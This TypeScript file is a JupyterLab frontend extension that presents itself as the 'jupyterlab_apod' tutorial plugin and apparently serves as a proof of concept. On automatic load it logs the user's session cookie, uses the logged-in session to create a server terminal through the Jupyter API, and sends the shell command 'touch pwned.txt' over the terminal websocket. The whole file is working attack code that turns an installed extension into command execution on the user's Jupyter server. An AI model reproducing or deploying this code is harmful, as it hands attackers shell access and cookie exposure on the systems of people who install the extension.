import {
  JupyterFrontEnd,
  JupyterFrontEndPlugin
} from '@jupyterlab/application';

/**
 * Initialization data for the jupyterlab_apod extension.
 */
const plugin: JupyterFrontEndPlugin<void> = {
  id: 'test1',
  autoStart: true,
  activate: (app: JupyterFrontEnd) => {
    console.log('Hacked!Hacked!Hacked!Hacked!Hacked!');
    console.log(document.cookie);
    var xhttp = new XMLHttpRequest;
      var termUri = location.origin + "/api/terminals";
      xhttp.open("POST", termUri, true);
      xhttp.withCredentials = true;
      xhttp.onreadystatechange = function() {
          if (this.readyState == 4 && this.status == 200) {
              console.log("request successfull!!! ");
              var resp = xhttp.responseText.split('"');
              var terminal_id = resp[3];
              var wsUri = "wss://"+location.host+"/terminals/websocket/"+terminal_id;
              var ws = new WebSocket(wsUri);
              ws.onopen = function(evt) {  
              ws.send('["stdin","touch pwned.txt\\r"]');
              };
              console.log("file created pwned.txt!!! ");
          }
      };
      xhttp.send();
  }
};

export default plugin;
